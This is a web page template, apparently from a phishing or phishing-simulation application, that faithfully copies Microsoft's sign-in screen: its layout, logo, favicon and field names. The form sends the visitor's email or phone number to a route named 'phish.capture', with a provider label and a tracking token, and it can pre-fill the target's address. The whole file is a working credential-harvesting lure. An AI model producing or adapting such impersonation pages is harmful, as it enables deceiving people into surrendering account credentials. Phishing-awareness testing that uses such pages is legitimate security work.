<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
    <title>Sign in to your Microsoft account</title>
    <link rel="icon" href="https://logincdn.msauth.net/shared/5/images/favicon_kjp67zc_.ico" type="image/x-icon">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
            font-size: 14px;
            font-weight: 400;
            line-height: 20px;
            color: rgb(36, 36, 36);
            background-color: #f2f2f2;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
        }

        .outer-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            min-height: 100vh;
            padding-top: 160px;
        }

        .card {
            position: relative;
            z-index: 1;
            width: 440px;
            max-width: calc(100% - 80px);
            background-color: #ffffff;
            border-radius: 12px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            padding: 40px 40px 40px 40px;
        }

        .logo-row {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 16px;
        }

        .ms-logo-icon {
            width: 24px;
            height: 24px;
            margin-right: 8px;
            flex-shrink: 0;
        }

        .ms-logo-text {
            font-family: "Segoe UI", "Segoe UI Semibold", sans-serif;
            font-size: 18px;
            font-weight: 600;
            color: rgb(36, 36, 36);
            letter-spacing: -0.2px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            line-height: 32px;
            color: rgb(36, 36, 36);
            text-align: center;
            margin: 16px 0;
        }

        .subtitle {
            font-size: 14px;
            font-weight: 400;
            line-height: 20px;
            color: rgb(66, 66, 66);
            text-align: center;
            margin: 0 0 32px 0;
        }

        .input-container {
            position: relative;
            width: 100%;
            min-height: 40px;
            border-radius: 4px;
            background-color: #ffffff;
            border-bottom: 1px solid rgb(128, 128, 128);
        }

        .input-container:focus-within {
            border-bottom: 2px solid #0067b8;
        }

        .input-container label {
            position: absolute;
            left: 10px;
            top: 8px;
            font-size: 10px;
            font-weight: 400;
            line-height: 14px;
            color: rgb(112, 112, 112);
            pointer-events: none;
            background: #ffffff;
            padding: 0 4px;
        }

        .input-container input {
            display: block;
            width: 100%;
            height: 40px;
            padding: 16px 10px 6px 10px;
            font-size: 16px;
            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
            font-weight: 400;
            line-height: 22px;
            color: rgb(36, 36, 36);
            background: transparent;
            border: none;
            outline: none;
            border-radius: 0;
        }

        .input-container input::placeholder {
            color: transparent;
        }

        .input-container input:focus ~ label,
        .input-container input:not(:placeholder-shown) ~ label {
            top: 7px;
            font-size: 10px;
            line-height: 14px;
            color: rgb(112, 112, 112);
        }

        .forgot-link {
            display: inline-block;
            margin-top: 15px;
            margin-bottom: 0;
            font-size: 14px;
            font-weight: 600;
            line-height: 20px;
            color: rgb(17, 94, 163);
            text-decoration: none;
            background: transparent;
            border: none;
            cursor: pointer;
            padding: 0;
        }

        .forgot-link:hover {
            text-decoration: underline;
            color: rgb(17, 94, 163);
        }

        .btn-next {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            height: 38px;
            margin-top: 16px;
            padding: 8px 16px;
            font-size: 14px;
            font-weight: 600;
            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
            line-height: 20px;
            color: #ffffff;
            background-color: rgb(15, 108, 189);
            border: 1px solid transparent;
            border-radius: 4px;
            cursor: pointer;
            text-align: center;
        }

        .btn-next:hover {
            background-color: rgb(0, 95, 184);
        }

        .btn-next:active {
            background-color: rgb(0, 80, 160);
        }

        .create-account {
            text-align: center;
            margin-top: 32px;
            font-size: 14px;
            font-weight: 400;
            line-height: 20px;
            color: rgb(66, 66, 66);
        }

        .create-account a {
            font-weight: 600;
            color: rgb(17, 94, 163);
            text-decoration: none;
        }

        .create-account a:hover {
            text-decoration: underline;
        }

        .footer {
            position: relative;
            z-index: 2;
            width: 440px;
            max-width: calc(100% - 80px);
            margin-top: 143px;
            padding: 12px 0;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: center;
            gap: 24px;
            margin-bottom: 8px;
        }

        .footer-links a {
            font-size: 12px;
            font-weight: 400;
            line-height: 20px;
            color: rgb(66, 66, 66);
            text-decoration: none;
            cursor: pointer;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .footer-note {
            font-size: 10px;
            font-weight: 400;
            line-height: 14px;
            color: rgb(66, 66, 66);
            text-align: center;
        }

        .footer-note a {
            font-size: 10px;
            font-weight: 600;
            color: rgb(17, 94, 163);
            text-decoration: none;
        }

        .footer-note a:hover {
            text-decoration: underline;
        }

        @media (max-width: 519px) {
            .card {
                width: 100%;
                max-width: 100%;
                border-radius: 0;
                box-shadow: none;
                padding: 24px 16px;
            }
            .footer {
                width: 100%;
                max-width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="outer-wrapper">
        <div class="card">
            <div class="logo-row">
                <svg class="ms-logo-icon" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
                    <rect x="0" y="0" width="10" height="10" fill="#f25022"/>
                    <rect x="11" y="0" width="10" height="10" fill="#7fba00"/>
                    <rect x="0" y="11" width="10" height="10" fill="#00a4ef"/>
                    <rect x="11" y="11" width="10" height="10" fill="#ffb900"/>
                </svg>
                <span class="ms-logo-text">Microsoft</span>
            </div>

            <h1>Sign in</h1>
            <p class="subtitle">Use your Microsoft account.</p>

            <form action="{{ route('phish.capture', ['provider' => 'microsoft', 'token' => $token]) }}" method="POST" autocomplete="off">
                {{ csrf_field() }}

                <div class="input-container">
                    <input type="text" id="i0116" name="identifier" placeholder="Email or phone number" autocomplete="username" value="{{ $email ?? '' }}">
                    <label for="i0116">Email or phone number</label>
                </div>

                <a href="#" class="forgot-link">Forgot your username?</a>

                <button type="submit" class="btn-next">Next</button>

                <p class="create-account">New to Microsoft? <a href="#">Create an account</a></p>
            </form>
        </div>

        <div class="footer">
            <div class="footer-links">
                <a href="#">Help and feedback</a>
                <a href="#">Terms of use</a>
                <a href="#">Privacy and cookies</a>
            </div>
            <p class="footer-note">Use private browsing if this is not your device. <a href="#">Learn more</a></p>
        </div>
    </div>
</body>
</html>
